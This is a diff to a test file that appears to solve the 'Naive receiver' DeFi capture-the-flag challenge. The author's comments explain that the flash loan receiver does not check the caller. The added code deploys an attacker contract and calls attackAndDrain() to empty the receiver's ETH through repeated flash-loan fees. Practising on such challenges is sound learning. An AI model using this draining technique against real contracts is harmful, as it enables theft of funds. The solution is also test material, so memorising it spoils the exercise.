@@ -30,7 +30,22 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */  
+        //Is there any way you can reduce the account's balance
+        //Call to take all 10 eth?
+        //Loop through it? but thats 10 different transaction
+        // for (let i = 0 ; i< 10;i++){
+        //     await this.pool.flashLoan(this.receiver.address,ethers.utils.parseEther("0"))
+        // }
+
+        // I took way too long for this, i thought that the challenge 
+        // This challenge does not have anyone verifing the msg.sender who calls the contract
+        //Thus you can just keep calling the function
+
+        //So essentially you can just get the receiver address to call that shit like 10 times in one transction using another attacker contract 
+        const AttackReciever = await ethers.getContractFactory("AttackReciever",attacker);
+        const contract = await AttackReciever.deploy(this.pool.address,this.receiver.address);
+        await contract.attackAndDrain(); 
     });
 
     after(async function () {
